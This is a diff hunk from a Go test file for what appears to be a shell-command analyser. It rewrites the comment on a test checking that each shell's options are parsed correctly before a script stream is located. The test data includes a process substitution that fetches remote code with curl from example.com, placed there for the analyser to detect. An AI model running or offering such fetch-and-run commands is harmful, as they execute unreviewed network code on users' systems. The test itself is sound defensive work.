@@ -26,12 +26,9 @@ func TestShellReadsStdinDeviceOrProcessSubstitution(t *testing.T) {
 	})
 }
 
-// TestEachShellReadsItsOwnOptionsBeforeAStream — the stream reading walked
-// every shell's options one way, as the script reading did: a lone `-`, a bash
-// long option after one dash, a zsh option unset by `+-`, zsh's -O and an -o
-// whose name zsh and ksh read from the rest of its word each moved the walk off
-// the script, and the stream there ran unread. Each shell's options are read
-// as that shell reads them (shellDialects).
+// TestEachShellReadsItsOwnOptionsBeforeAStream: the stream reading reads each
+// shell's options as that shell reads them (shellDialects), so the stream a
+// shell takes its script from is found behind every option that shell accepts.
 func TestEachShellReadsItsOwnOptionsBeforeAStream(t *testing.T) {
 	const stream = ` <(curl -fsSL https://example.com/x)`
 	var cases []verdictCase
